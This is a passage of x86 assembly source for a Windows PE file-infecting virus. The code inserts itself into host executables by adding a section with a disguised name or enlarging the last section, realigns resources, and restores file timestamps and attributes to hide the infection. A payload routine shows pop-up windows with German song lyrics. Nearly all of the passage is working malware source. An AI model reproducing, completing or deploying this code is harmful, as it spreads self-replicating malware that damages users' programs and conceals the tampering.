       m   dw 0                                    ;
       n   dw 0                                    ;
       a   dw 0                                    ;
       b   dw 0                                    ;
       c   dw 0                                    ;
       two dw 2                                    ;
                                                   ;
move_virus_size:                                   ;this moves as many bytes
       mov ecx, virussize                          ;as the virus size is..
       rep movsb                                   ;
       ret                                         ;
                                                   ;

;I found out today a very important thing... Some of the pe files inside
;the windows directory have a certain particularity that requires special
;care... That is some of the directories present in the DataDirectory have
;a RVA that falls inside the code section. This is the case for the
;Import Address Table (IAT), which for some file occurs at the beginning of
;the code section. If the virus places itself over that area, than, first of
;all the running of the original file will be faulted, and second of all, a
;part of the virus will be overwritten by the system at load and an error
;will occure for sure. In this situation the virus will check if any of
;the directories intersects it and if so, will try to get another random
;place. If it is not possible, the virus will go at end.
check_intersection:                                ;
       pusha                                       ;save registers!
       mov edi, esi                                ;
       add edi, eax                                ;
       sub edi, [ebp+codesectionraw]               ;
       add edi, [ebp+codesectionrva]               ;
                                                   ;
       mov esi, [ebp+optionalheader]               ;
       lea ebx, [esi.OH_DataDirectory]             ;
       push ecx                                    ;
       mov ecx, [ebp+numberofrva]                  ;how many directories?
       mov edx, 0                                  ;index in directories.
                                                   ;
check_directories:                                 ;
       pusha                                       ;save all again!
       mov esi, [ebx.edx.DD_VirtualAddress]        ; x   = X (esi)
       or esi, esi                                 ;
       jz ok_next_dir                              ;
       mov eax, esi                                ; x+y = Y (eax)
       add eax, [ebx.edx.DD_Size]                  ;
                                                   ;
       mov ebx, edi                                ; a   = A (edi)
       add ebx, virussize                          ; a+b = B (ebx)
                                                   ;
;We have to check if the interval (X,Y) intersects interval (A,B)
                                                   ;
       cmp esi, edi                                ; X<A?
       jbe YYY1                                    ;
       ja XXX1                                     ;
                                                   ;
                                                   ;
YYY1:                                              ;
       cmp eax, edi                                ;Y<A?
       jbe ok_next_dir                             ;
       jmp Intersect                               ;
                                                   ;
XXX1:                                              ;
       cmp esi, ebx                                ;X>B?
       jb Intersect                                ;
                                                   ;
ok_next_dir:                                       ;
       popa                                        ;
       add edx, 8                                  ;
       loop check_directories                      ;
       pop ecx                                     ;
       popa                                        ;
       clc                                         ;
       ret                                         ;
                                                   ;
Intersect:                                         ;
       popa                                        ;
       pop ecx                                     ;
       popa                                        ;
       stc                                         ;
       ret                                         ;
                                                   ;
locate_last_section_stuff:                         ;
       pusha                                       ;
                                                   ;
       mov esi, [ebp+optionalheader]               ;
       add esi, [ebp+sizeofoptionalheader]         ;
       mov eax, [ebp+numberofsections]             ;get number of sections
                                                   ;
       push eax esi                                ;first calculate the
       mov ecx, eax                                ;
       mov eax, [esi.SH_PointerToRawData]          ;
       mov [ebp+lowest_section_raw], eax           ;lowest pointer to raw
       xor edx, edx                                ;
                                                   ;
compare_rva:                                       ;
       add edx, [esi.SH_VirtualSize]               ;
       mov eax, [esi.SH_PointerToRawData]          ;
       cmp [ebp+lowest_section_raw], eax           ;
       jbe next_compare                            ;
       xchg [ebp+lowest_section_raw], eax          ;
                                                   ;
next_compare:                                      ;
       add esi, IMAGE_SIZEOF_SECTION_HEADER        ;
       loop compare_rva                            ;
                                                   ;
;      add edx, [ebp+sizeofheaders]                ;useless crap...
;      mov [ebp+totalsizes], edx                   ;
                                                   ;
       pop esi eax                                 ;
                                                   ;
       dec eax                                     ;go for last
       mov ecx, IMAGE_SIZEOF_SECTION_HEADER        ;multiply with the size
       xor edx, edx                                ;of a section
       mul ecx                                     ;
       add esi, eax                                ;
       mov [ebp+lastsectionheader], esi            ;save pointer to header
       mov eax, [esi.SH_VirtualAddress]            ;
       mov [ebp+lastsectionrva], eax               ;
       mov eax, [esi.SH_PointerToRawData]          ;
       mov [ebp+lastsectionraw], eax               ;
       mov eax, [esi.SH_SizeOfRawData]             ;choose the smaller of
       mov ebx, [esi.SH_VirtualSize]               ;the sizes


; Major fix-up!! Many PE files mark in the section header a value which is
; much smaller than the real size of the data. The real value gets calculated
; somehow by the loader, so if we place at the end of one of the sizes we
; will probably overwrite data, so I will simply place it at the end of
; the file, even if this means increasing the infected victim.
;
; if you want to enable the placing in the last section cavity unmark the
; following lines:
;
;      call choose_smaller                         ;
;      or eax, eax                                 ;if one is zero, try the
;      jnz last_size_ok                            ;other; if both are 0...
;      xchg eax, ebx                               ;
;      or eax, eax                                 ;
;      jnz last_size_ok                            ;
                                                   ;
consider_eof:                                      ;...consider the EOF as
       mov eax, [ebp+filesize]                     ;the last section dest.
       jmp save_it                                 ;
                                                   ;
last_size_ok:                                      ;if the size is ok, then
       mov ebx, [esi.SH_PointerToRawData]          ;retrieve the pointer to
       or ebx, ebx                                 ;raw data. If it is 0
       jz consider_eof                             ;take eof, otherwise add
       add ebx, eax                                ;it to obtain the pos.
       xchg ebx, eax                               ;
       cmp eax, [ebp+filesize]                     ;if it exceedes the file
       ja consider_eof                             ;size also consider EOF.
                                                   ;
save_it:                                           ;
       mov [ebp+last_section_destination], eax     ;save last section pointer
       mov eax, [esi.SH_VirtualAddress]            ;
       mov esi, [ebp+optionalheader]               ;
       mov ebx, [esi.OH_DataDirectory.DE_BaseReloc.DD_VirtualAddress]
       cmp eax, ebx                                ;
       jne not_relocations                         ;
       mov [ebp+situation], RELOCATIONS_LAST       ;
       jmp done_last                               ;
                                                   ;
not_relocations:                                   ;
       mov ebx, [esi.OH_DataDirectory.DE_Resource.DD_VirtualAddress]
       cmp eax, ebx                                ;
       jne no_resources                            ;
       mov [ebp+situation], RESOURCES_LAST         ;
       jmp done_last                               ;
                                                   ;
no_resources:                                      ;
       mov [ebp+situation], WE_ARE_LAST            ;
                                                   ;
done_last:                                         ;
       popa                                        ;
       ret                                         ;
                                                   ;
add_new_section:                                   ;
       pusha                                       ;save all
       mov eax, 123h                               ;choose some random
       call brandom32                              ;increasement
       add eax, virussize                          ;
       mov [ebp+newraw], eax                       ;save new raw
       call align_to_filealign                     ;
       mov [ebp+newsize], eax                      ;save new aligned size
                                                   ;
       mov esi, [ebp+optionalheader]               ;
       mov ecx, [ebp+numberofrva]                  ;
       add esi, [ebp+sizeofoptionalheader]         ;
       sub esi, 8                                  ;
       mov eax, 0EEEEEEEEh                         ;
                                                   ;
choose_smallest_directory_va:                      ;
       mov ebx, [esi]                              ;
       or ebx, ebx                                 ;
       jz go_to_next                               ;
       cmp eax, ebx                                ;
       ja found_smaller_va                         ;
       jmp go_to_next                              ;
                                                   ;
found_smaller_va:                                  ;
       mov eax, ebx                                ;
                                                   ;
go_to_next:                                        ;
       sub esi, 8                                  ;
       loop choose_smallest_directory_va           ;
                                                   ;
       mov [ebp+smallest_dir_va], eax              ;
       sub eax, IMAGE_SIZEOF_SECTION_HEADER        ;
       add eax, [ebp+haddress]                     ;
                                                   ;
       mov esi, [ebp+lastsectionheader]            ;go to last section header
       mov ecx, IMAGE_SIZEOF_SECTION_HEADER        ;
                                                   ;
       mov ebx, esi                                ;
       add ebx, ecx                                ;
       add ebx, ecx                                ;
       cmp ebx, eax                                ;
       ja its_not_ok                               ;
                                                   ;
       mov edi, esi                                ;
       add edi, ecx                                ;
       mov eax, edi                                ;can we insert a new
       sub eax, [ebp+haddress]                     ;section header?
       add eax, IMAGE_SIZEOF_SECTION_HEADER        ;
       cmp eax, [ebp+lowest_section_raw]           ;
       jb its_ok                                   ;
                                                   ;
its_not_ok:                                        ;
       popa                                        ;
       stc                                         ;
       ret                                         ;
                                                   ;
its_ok:                                            ;
       rep movsb                                   ;and make a copy of it
                                                   ;
       mov eax, [ebp+sizeofheaders]                ;
       sub edi, [ebp+haddress]                     ;
       cmp edi, eax                                ;
       jbe ok_header_size                          ;
       add eax, IMAGE_SIZEOF_SECTION_HEADER        ;
       call align_to_filealign                     ;
       mov [ebp+sizeofheaders], eax                ;
                                                   ;
ok_header_size:                                    ;
       cmp [ebp+situation], WE_ARE_LAST            ;are we at end?
       jne not_last                                ;
                                                   ;
       mov esi, [ebp+lastsectionheader]            ;if yes, then we
       mov ebx, [esi.SH_VirtualAddress]            ;rearrange the last header
       mov eax, [ebp+last_section_destination]     ;
       sub eax, [esi.SH_PointerToRawData]          ;
       call align_to_filealign                     ;
       add ebx, eax                                ;
       add esi, IMAGE_SIZEOF_SECTION_HEADER        ;
       mov [esi.SH_VirtualAddress], eax            ;
       call set_our_sizes                          ;and set our sizes
       jmp done_adding                             ;
                                                   ;
not_last:                                          ;if we are not last, we
       mov eax, [ebp+filesize]                     ;
       sub eax, [esi.SH_PointerToRawData]          ;must rearrange both
       mov ecx, eax                                ;headers
       mov esi, [esi.SH_PointerToRawData]          ;
       mov [ebp+last_section_destination], esi     ;
       add esi, [ebp+haddress]                     ;
       add esi, eax                                ;
       mov edi, esi                                ;
       add edi, [ebp+newsize]                      ;
       std                                         ;
       rep movsb                                   ;and move the last section
       cld                                         ;below our new section
       mov esi, [ebp+lastsectionheader]            ;
       call set_our_sizes                          ;
       mov ebx, [esi.SH_VirtualAddress]            ;
       add ebx, [esi.SH_SizeOfRawData]             ;
       add esi, IMAGE_SIZEOF_SECTION_HEADER        ;
       mov eax, [ebp+newsize]                      ;
       add [esi.SH_PointerToRawData], eax          ;
       mov eax, ebx                                ;
       call align_to_sectionalign                  ;
       mov [esi.SH_VirtualAddress], eax            ;
       mov esi, [ebp+optionalheader]               ;
                                                   ;
       cmp [ebp+situation], RESOURCES_LAST         ;check if we must fix
       jne then_relocs                             ;resources
                                                   ;
       mov [esi.OH_DataDirectory.DE_Resource.DD_VirtualAddress], ebx
       call RealignResources                       ;
       jmp done_adding                             ;
                                                   ;
then_relocs:                                       ;
       mov [esi.OH_DataDirectory.DE_BaseReloc.DD_VirtualAddress], ebx
       call RealignRelocs                          ;
       jmp done_adding                             ;
                                                   ;
set_our_sizes:                                     ;
       call set_our_name                           ;
       mov eax, [ebp+newraw]                       ;set our new raw size
       mov [esi.SH_VirtualSize], eax               ;and our virtual size
       call align_to_filealign                     ;
       mov [esi.SH_SizeOfRawData], eax             ;
       mov [esi.SH_Characteristics], IMAGE_SCN_MEM_WRITE+IMAGE_SCN_MEM_READ+\
                                     IMAGE_SCN_CNT_INITIALIZED_DATA
       ret                                         ;
                                                   ;
done_adding:                                       ;
       popa                                        ;
       clc                                         ;
       ret                                         ;
                                                   ;
set_our_name:                                      ;
       pusha                                       ;
       push esi                                    ;
       mov esi, [ebp+optionalheader]               ;
       add esi, [ebp+sizeofoptionalheader]         ;
       mov ecx, [ebp+numberofsections]             ;
       mov ebx, section_names_number               ;
                                                   ;
compare_names:                                     ;
       push ecx                                    ;
       lea edi, [ebp+section_names]                ;
       mov ecx, section_names_number               ;
                                                   ;
compare:                                           ;
       inc edi                                     ;
       push ecx esi edi                            ;
       mov ecx, 8                                  ;
       rep cmpsb                                   ;
       je mark_it                                  ;
                                                   ;
next_name:                                         ;
       pop edi esi ecx                             ;
       add edi, 8                                  ;
       loop compare                                ;
       jmp next_section                            ;
                                                   ;
mark_it:                                           ;
       mov byte ptr [edi-9], 0                     ;
       dec ebx                                     ;
       pop edi esi ecx                             ;
       jmp next_section                            ;
                                                   ;
next_section:                                      ;
       add esi, IMAGE_SIZEOF_SECTION_HEADER        ;
       pop ecx                                     ;
       loop compare_names                          ;
                                                   ;
       or ebx, ebx                                 ;
       jz choose_safe                              ;
       mov eax, ebx                                ;
       call brandom32                              ;
       lea edi, [ebp+section_names]                ;
       sub edi, 9                                  ;
       mov ecx, eax                                ;
       or ecx, ecx                                 ;
       jnz choose_name                             ;
       add edi, 9                                  ;
       jmp done_choosing                           ;
                                                   ;
choose_name:                                       ;
       add edi, 9                                  ;
       cmp byte ptr [edi], 1                       ;
       je looping                                  ;
       inc ecx                                     ;don't count it
                                                   ;
looping:                                           ;
       loop choose_name                            ;
                                                   ;
done_choosing:                                     ;
       inc edi                                     ;
       pop esi                                     ;
       xchg esi, edi                               ;
       mov ecx, 8                                  ;
       rep movsb                                   ;
       popa                                        ;
       ret                                         ;
                                                   ;
choose_safe:                                       ;
       lea edi, [ebp+safe]                         ;
       jmp done_choosing                           ;
                                                   ;
section_names:                                     ;our new section not so
       db 1, "DATA"  , 0, 0, 0, 0                  ;random name...
       db 1, ".data" , 0, 0, 0                     ;
       db 1, ".idata", 0, 0                        ;
       db 1, ".udata", 0, 0                        ;
       db 1, "BSS"   , 0, 0, 0, 0, 0               ;
       db 1, ".rdata", 0, 0                        ;
       db 1, ".sdata", 0, 0                        ;
       db 1, ".edata", 0, 0                        ;
section_names_number = ($-offset section_names)/9  ;
safe   db 0,0,0,0,0,0,0,0                          ;
                                                   ;
increase_last_section:                             ;
       mov [ebp+method], METHOD_INCREASE_LAST      ;
       mov esi, [ebp+lastsectionheader]            ;
       mov eax, [ebp+newraw]                       ;
       add [esi.SH_SizeOfRawData], eax             ;
       mov eax, [ebp+newsize]                      ;
       add [esi.SH_VirtualSize], eax               ;
       mov eax, [ebp+last_section_destination]     ;
       add eax, [ebp+haddress]                     ;
       mov [ebp+finaldestination], eax             ;
       or [esi.SH_Characteristics], IMAGE_SCN_MEM_WRITE+IMAGE_SCN_MEM_READ
       ret                                         ;
                                                   ;
CalculateDelta:
       mov esi, [ebp+lastsectionheader]            ;go to last section
       mov eax, [esi.SH_VirtualAddress]            ;and calculate the
       add esi, IMAGE_SIZEOF_SECTION_HEADER        ;RVA delta
       sub eax, [esi.SH_VirtualAddress]            ;
       neg eax                                     ;
       ret                                         ;
                                                   ;
RealignResources:                                  ;
       call CalculateDelta                         ;
       mov [ebp+DeltaRVA], eax                     ;
       mov esi, dword ptr [esi.SH_PointerToRawData]; Point the resources
       add esi, dword ptr [ebp+haddress]           ; and align in memo
       mov edi, esi                                ; save in edi
       add edi, IMAGE_RESOURCE_DIRECTORY_SIZE      ; skip resource dir
       call parse_resource_directory               ; parse all
       ret                                         ;
                                                   ;
parse_resource_directory:                          ;
       xor ecx, ecx                                ;
       mov cx, word ptr [esi.RD_NumberOfNamedEntries]; NamedEntries+IdEntries
       add cx, word ptr [esi.RD_NumberOfIdEntries] ; is our counter
                                                   ;
       add esi, IMAGE_RESOURCE_DIRECTORY_SIZE      ; skip resource dir
                                                   ;
parse_this_one:                                    ;
       push ecx                                    ; save counter
       push esi                                    ; save address
       call parse_resource                         ; parse the dir
       pop esi                                     ; restore address
       pop ecx                                     ; restore counter
       add esi, 8                                  ; get next entry
       loop parse_this_one                         ; loop until cx=0
       ret                                         ; return
                                                   ;
parse_resource:                                    ;
       mov eax, [esi.RDE_OffsetToData]             ; get offset to data
       mov esi, edi                                ; get base of resorurces
       test eax, 80000000h                         ; is it a subdirectory?
       jz data_is_resource                         ;
                                                   ;
data_is_directory:                                 ;
       xor eax, 80000000h                          ; if it is a subdirectory
       add esi, eax                                ; find it's address and
       sub esi, 10h                                ;
       call parse_resource_directory               ; go to parse it too...
       ret                                         ;
                                                   ;
data_is_resource:                                  ; if it is data, then
       add esi, eax                                ; find out it's address
       sub esi, 10h                                ;
       mov eax, dword ptr [ebp+DeltaRVA]           ; and increment the offs
       add dword ptr [esi.REDE_OffsetToData], eax  ; to data with our Delta
       ret                                         ; and ret...
                                                   ;
RealignRelocs:                                     ;
       ret                                         ;
                                                   ;
infection_succesfull:                              ;
       mov [ebp+flag], 0                           ;mark good infection
                                                   ;
close_address:                                     ;
       call [ebp+_UnmapViewOfFile], [ebp+haddress] ;unmap view
                                                   ;
close_map:                                         ;
       call [ebp+_CloseHandle], [ebp+hmap]         ;close map object
                                                   ;
close_file:                                        ;
       call [ebp+_SetFilePointer], [ebp+hfile], [ebp+filesize], 0, FILE_BEGIN
       call [ebp+_SetEndOfFile], [ebp+hfile]       ;set EOF
       lea ebx, [ebp+filetime1]                    ;restore the file time
       push ebx                                    ;
       add ebx, 8                                  ;
       push ebx                                    ;
       add ebx, 8                                  ;
       push ebx                                    ;
       push [ebp+hfile]                            ;
       call [ebp+_SetFileTime]                     ;restore file time
       call [ebp+_CloseHandle], [ebp+hfile]        ;close file
                                                   ;
finished:                                          ;
       call [ebp+_SetFileAttributesA], [ebp+filename], [ebp+fileattributes]
       cmp [ebp+flag], 0                           ;restore attributes
       je succesfull_infection                     ;
                                                   ;
failed_infection:                                  ;
       mov [ebp+fileopen], FALSE                   ;
       popa                                        ;
       stc                                         ;
       ret                                         ;
                                                   ;
succesfull_infection:                              ;
       mov [ebp+fileopen], FALSE                   ;
       popa                                        ;
       clc                                         ;
       ret                                         ;
                                                   ;
choose_smaller:                                    ;
       cmp eax, ebx                                ;
       ja get_ebx                                  ;
       ret                                         ;
                                                   ;
get_ebx:                                           ;
       xchg eax, ebx                               ;
       ret                                         ;
                                                   ;
align_to_filealign:                                ;here are the aligning
       mov ecx, [ebp+filealign]                    ;procedures
       jmp align_eax                               ;
                                                   ;
align_to_sectionalign:                             ;
       mov ecx, [ebp+sectionalign]                 ;
                                                   ;
align_eax:                                         ;
       push edx                                    ;
       xor edx, edx                                ;
       div ecx                                     ;
       or edx, edx                                 ;
       jz $+3                                      ;
       inc eax                                     ;
       mul ecx                                     ;
       pop edx                                     ;
       ret                                         ;
                                                   ;
InfectFile endp                                    ;
                                                   ;
fileattributes           dd 0                      ;
filesize                 dd 0                      ;
filetime1                dq 0                      ;
filetime2                dq 0                      ;
filetime3                dq 0                      ;
hfile                    dd 0                      ;
hmap                     dd 0                      ;
haddress                 dd 0                      ;
flag                     dd 0                      ;
additional               dd 0                      ;
peheader                 dd 0                      ;
lastsectionheader        dd 0                      ;
last_section_destination dd 0                      ;
codesectionraw           dd 0                      ;
codesectionheader        dd 0                      ;
finaldestination         dd 0                      ;
method                   dd 0                      ;
pedata                   label                     ;
numberofsections         dd 0                      ; stored as dword!!
sizeofoptionalheader     dd 0                      ; stored as dword!!
addressofentrypoint      dd 0                      ;
_imagebase               dd 0                      ;
sectionalign             dd 0                      ;
filealign                dd 0                      ;
sizeofimage              dd 0                      ;
sizeofheaders            dd 0                      ;
checksum                 dd 0                      ;
numberofrva              dd 0                      ;
baseofcode               dd 0                      ;
codesection              dd 0                      ;
codesectionsize          dd 0                      ;
lastsection              dd 0                      ;
lastsectionsize          dd 0                      ;
increasement             dd 0                      ;
codedelta                dd 0                      ;
optionalheader           dd 0                      ;
filename                 dd 0                      ;
copying                  db 0                      ;
lastsectionraw           dd 0                      ;
lastsectionrva           dd 0                      ;
codesectionrva           dd 0                      ;
codesource               dd 0                      ;
codedestin               dd 0                      ;
PayloadThreadID          dd 0                                                   ;
;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ;
;≥ ‹‹‹ ‹‹‹ ‹ ‹ ‹   ‹‹‹ ‹‹‹ ‹‹                      ;
;≥ €‹€ €‹€ €‹€ €   € € €‹€ € €                     ;
;≥ €   € €  €  €‹‹ €‹€ € € €‹ﬂ                     ;
;≥                                                 ;
                                                   ;
DoPayload:                                         ;
       cmp [ebp+firstgen], 1                       ;
       jne do_it_now                               ;
       ret                                         ;
do_it_now:                                         ;
       pusha                                       ;
       lea esi, [ebp+text_start]                   ;
       mov ecx, list_len                           ;
       call not_list                               ;
                                                   ;
       lea eax, [ebp+text_start]                   ;
       mov [ebp+current], eax                      ;
       call [ebp+_GetDC], 0                        ;
       mov [ebp+hdc], eax                          ;
       lea ebx, [ebp+offset chars]                 ;
       call [ebp+_GetCharWidthA], eax, "A", "Z", ebx
       lea ebx, [ebp+offset textmetric]            ;
       call [ebp+_GetTextMetricsA], [ebp+hdc], ebx ;
       call [ebp+_GetSystemMetrics], SM_CXFULLSCREEN
       mov [ebp+xmax], eax                         ;
       call [ebp+_GetSystemMetrics], SM_CYFULLSCREEN
       mov [ebp+ymax], eax                         ;
                                                   ;
       xor eax, eax                                ;
       mov ax, [ebp+textmetric.tmHeight]           ;
       add ax, [ebp+textmetric.tmAscent]           ;
       add ax, [ebp+textmetric.tmDescent]          ;
       shl eax, 1                                  ;
       mov [ebp+ylength], eax                      ;
                                                   ;
new_window:                                        ;
        mov edi, [ebp+current]                     ;
        call [ebp+_lstrlen], edi                   ;
        add edi, eax                               ;
        inc edi                                    ;
        push eax                                   ;
        call [ebp+_lstrlen], edi                   ;
        mov edi, [ebp+current]                     ;
        cmp eax, [esp]                             ;
        jb ok_len                                  ;
        add edi, [esp]                             ;
        inc edi                                    ;
        xchg eax, [esp]                            ;
                                                   ;
ok_len:                                            ;
        pop ecx                                    ;
                                                   ;
        lea esi, [ebp+chars]                       ;
        xchg edi, esi                              ;
        mov [ebp+xlength], 0                       ;
        xor eax, eax                               ;
                                                   ;
calculate_length:                                  ;
        lodsb                                      ;
        cmp al, "A"                                ;
        jnb do_Z                                   ;
                                                   ;
estimate:                                          ;
        xor ebx, ebx                               ;
        mov bx, [ebp+textmetric.tmAveCharWidth]    ;
        inc ebx                                    ;
        jmp compute                                ;
                                                   ;
do_Z:   cmp al, "Z"                                ;
        jna do_chars                               ;
        jmp estimate                               ;
                                                   ;
do_chars:                                          ;
        sub eax, "A"                               ;
        mov ebx, [edi+eax*4]                       ;
        inc ebx                                    ;
                                                   ;
compute:                                           ;
        add [ebp+xlength], ebx                     ;
        loop calculate_length                      ;
                                                   ;
        call [ebp+_GetModuleHandleA], 0            ; get our handle
        mov [ebp+hInst], eax                       ; save it
                                                   ;
        mov [ebp+wc.wcxStyle], CS_HREDRAW+CS_VREDRAW+\;window style
                           CS_GLOBALCLASS+CS_NOCLOSE
        lea eax, [ebp+offset WndProc]              ;
        mov [ebp+wc.wcxWndProc], eax               ; window procedure
        mov [ebp+wc.wcxClsExtra], 0                ; -
        mov [ebp+wc.wcxWndExtra], 0                ; -
        mov eax, [ebp+hInst]                       ;
        mov [ebp+wc.wcxInstance], eax              ; instance (handle)
                                                   ;
        call [ebp+_LoadIconA], [ebp+hInst], IDI_APPLICATION ; load our icon
        mov [ebp+ourhIcon], eax                    ;
        mov [ebp+wc.wcxIcon], eax                  ;
        mov [ebp+wc.wcxSmallIcon], eax             ;
                                                   ;
        call [ebp+_LoadCursorA], 0, IDC_ARROW      ; load out cursor
        mov [ebp+wc.wcxCursor], eax                ;
                                                   ;
        mov [ebp+wc.wcxBkgndBrush], COLOR_WINDOW+1 ;
        mov dword ptr [ebp+wc.wcxMenuName], NULL   ; menu
        lea eax, [ebp+szClassName]                 ;
        mov dword ptr [ebp+wc.wcxClassName], eax   ; class name
                                                   ;
        lea eax, [ebp+offset wc]                   ;
        call [ebp+_RegisterClassExA], eax          ; register the class!
                                                   ;
        mov eax, [ebp+xmax]                        ;
        sub eax, [ebp+xlength]                     ;
        call brandom32                             ;
        mov [ebp+xpos], eax                        ;
                                                   ;
        mov eax, [ebp+ymax]                        ;
        sub eax, [ebp+ylength]                     ;
        call brandom32                             ;
        mov [ebp+ypos], eax                        ;
                                                   ;
        lea eax, [ebp+offset szClassName]          ;
        lea ebx, [ebp+offset szTitleName]          ;
        call [ebp+_CreateWindowExA],ExtendedStyle,\; Create the Window!
                             eax,\                 ;
                             ebx,\                 ;
                             DefaultStyle,\        ;
                             [ebp+xpos],\          ;
                             [ebp+ypos],\          ;
                             [ebp+xlength],\       ;
                             [ebp+ylength],\       ;
                             0,\                   ;
                             0,\                   ;
                             [ebp+hInst],\         ;
                             0                     ;
                                                   ;
        mov [ebp+newhwnd], eax                     ; save handle
                                                   ;
        call [ebp+_UpdateWindow], dword ptr [ebp+newhwnd]; and update it...
        call [ebp+_InvalidateRect], dword ptr [ebp+newhwnd], 0, 0
                                                   ;
msg_loop:                                          ;
        lea eax, [ebp+offset msg]                  ;
        call [ebp+_GetMessageA], eax, 0, 0, 0      ; get a message
                                                   ;
        or ax, ax                                  ; finish?
        jz end_loop                                ;
                                                   ;
        lea eax, [ebp+offset msg]                  ;
        call [ebp+_TranslateMessage], eax          ; translate message
                                                   ;
        lea eax, [ebp+offset msg]                  ;
        call [ebp+_DispatchMessageA], eax          ; dispatch the message
                                                   ;
        jmp msg_loop                               ; do again
                                                   ;
end_loop:                                          ;
        mov esi, [ebp+current]                     ;
        @endsz                                     ;
        @endsz                                     ;
        lea eax, [ebp+offset text_end]             ;
        cmp esi, eax                               ;
        jae finish_process                         ;
        cmp [ebp+process_end], 1                   ;did the victim finish?
        je finish_process                          ;
        mov [ebp+current], esi                     ;
        jmp new_window                             ;
                                                   ;
finish_process:                                    ;
        popa                                       ;
        ret                                        ;
process_end dd 0                                   ;
                                                   ;
;============================================================================
WndProc proc uses ebx edi esi,\                    ; registers preserved
        hwnd:DWORD, wmsg:DWORD, wparam:DWORD, lparam:DWORD ; parameters
        LOCAL   theDC:DWORD                        ;
                                                   ;
        call @@1                                   ;
@@1:                                               ;
        pop esi                                    ;
        sub esi, offset @@1                        ;
                                                   ;
        cmp [wmsg], WM_PAINT                       ;
        je wmpaint                                 ;
        cmp [wmsg], WM_DESTROY                     ; destory window
        je wmdestroy                               ;
        cmp [wmsg], WM_CREATE                      ; create window
        je wmcreate                                ;
        cmp [wmsg], WM_TIMER                       ;
        jmp defwndproc                             ;
                                                   ;
defwndproc:                                        ;
        call [esi+_DefWindowProcA], [hwnd], [wmsg], [wparam], [lparam] ; define
        jmp  finish                                ; the window
                                                   ;
wmdestroy:                                         ;
        call [esi+_ShowWindow], [hwnd], SW_HIDE    ;
        call [esi+_KillTimer], [hwnd], [esi+htimer];
        call [esi+_PostQuitMessage], 0             ; kill the window
        xor eax, eax                               ;
        jmp finish                                 ;
                                                   ;
wmpaint:                                           ;
        call [esi+_GetDC], [hwnd]                  ;
        mov [theDC], eax                       ;
        lea eax, [esi+offset lppaint]              ;
        call [esi+_BeginPaint], dword ptr [hwnd],\ ;
                         eax                       ;
        push [esi+current]                         ;
        call [esi+_lstrlen]                        ;
        push eax                                   ;
        call [esi+_TextOutA], dword ptr [theDC], 1, 1,\
                       dword ptr [esi+current], eax;
        pop eax                                    ;
        mov ebx, [esi+current]                     ;
        add ebx, eax                               ;
        inc ebx                                    ;
        push ebx                                   ;
        push ebx                                   ;
        call [esi+_lstrlen]                        ;
        pop ebx                                    ;
        xor edx, edx                               ;
        mov dx, [esi+textmetric.tmHeight]          ;
        call [esi+_TextOutA], dword ptr [theDC], 1, edx, ebx, eax
        lea eax, [esi+offset lppaint]              ;
        call [esi+_EndPaint], dword ptr [hwnd], eax
        jmp defwndproc                             ;
                                                   ;
wmcreate:                                          ;
        lea eax, [esi+offset TimerProc]            ;
        call [esi+_SetTimer], dword ptr [hwnd], 1111h,\
                       dword ptr [esi+wintime],\   ;
                       eax                         ;
        mov [esi+htimer], eax                      ;
        jmp defwndproc                             ;
                                                   ;
finish:                                            ;
        ret                                        ;
WndProc endp                                       ;
                                                   ;
TimerProc proc uses ebx edi esi,\                  ;
          hwnd:DWORD, wmsg:DWORD, timerid:DWORD, dwtime:DWORD
                                                   ;
       call @@2                                    ;
@@2:                                               ;
       pop esi                                     ;
       sub esi, offset @@2                         ;
                                                   ;
       mov eax, [esi+htimer]                       ;
       cmp [timerid], eax                          ;
       jne exittime                                ;
       call [esi+_PostMessageA], [hwnd], WM_DESTROY, 0, 0
                                                   ;
exittime:                                          ;
       ret                                         ;
TimerProc endp                                     ;
                                                   ;
text_start:                                        ;
    noter <LA? MICH DEINE TRANE REITEN>            ;
    noter <UBERS KINN NACH AFRIKA>                 ;
                                                   ;
    noter <WIEDER IN DEN SCHOSS DER LOWIN>         ;
    noter <WO ICH EINST ZUHAUSE WAR>               ;
                                                   ;
    noter <ZWISCHEN DEINE LANGEN BEINEN>           ;
    noter <SUCH DEN SCHNEE VOM LETZTEN JAHR>       ;
                                                   ;
    noter <DOCH ES IST KEIN SCHNEE MEHR DA>        ;
    noter <..>                                     ;
                                                   ;
    noter <LASS MICH DEINE TRANE REITEN>           ;
    noter <UBER WOLKEN OHNE GLUCK>                 ;
                                                   ;
    noter <DER GROSSE VOGEL SCHIEBT DEN KOPF>      ;
    noter <SANFT IN SEIN VERSTECK ZURUCK>          ;
                                                   ;
    noter <ZWISCHEN DEINE LANGEN BEINEN>           ;
    noter <SUCH DEN SAND VOM LETZTEN JAHR>         ;
                                                   ;
    noter <DOCH ES IST KEIN SAND MEHR DA>          ;
    noter <..>                                     ;
                                                   ;
    noter <SEHNSUCHT VERSTECKT  >                  ;
    noter <SICH WIE EIN INSEKT>                    ;
                                                   ;
    noter <IM SCHLAFE MERKST DU NICHT>             ;
    noter <DA? ES DICH STICHT>                     ;
                                                   ;
    noter <GLUCKLICH WERD ICH NIRGENDWO>           ;
    noter <DER FINGER RUTSCHT NACH MEXIKO>         ;
                                                   ;
    noter <DOCH ER VERSINKT IM OZEAN>              ;
    noter <SEHNSUCHT IST SO GRAUSAM>               ;
                                                   ;
    noter <WOLLT IHR DAS BETT IN FLAMMEN SEHEN? >  ;
    noter <WOLLT IHR IN HAUT UND HAAREN UNTERGEHEN?>
                                                   ;
    noter <IHR WOLLT DOCH AUCH DEN DOLCH INS LAKEN STECKEN >
    noter <IHR WOLLT DOCH AUCH DAS BLUT VOM DEGEN LECKEN >
                                                   ;
    noter <RAMMSTEIN!! RAMMSTEIN!! >               ;
    noter <RAMMSTEIN!! RAMMSTEIN!! >               ;
                                                   ;
    noter <IHR SEHT DIE KREUZE AUF DEM KISSEN >    ;
    noter <IHR MEINT EUCH DARF DIE UNSCHULD KUSSEN >
                                                   ;
    noter <IHR GLAUBT ZU TOTEN WARE SCHWER >       ;
    noter <DOCH WO KOMMEN ALL DIE TOTEN HER >      ;
                                                   ;
    noter <RAMMSTEIN!! RAMMSTEIN!! >               ;
    noter <RAMMSTEIN!! RAMMSTEIN!! >               ;
                                                   ;
    noter <SEX IST EIN SCHLACHT >                  ;
    noter <LIEBE IST KRIEG >                       ;
                                                   ;
    noter <RAMMSTEIN!! RAMMSTEIN!! >               ;
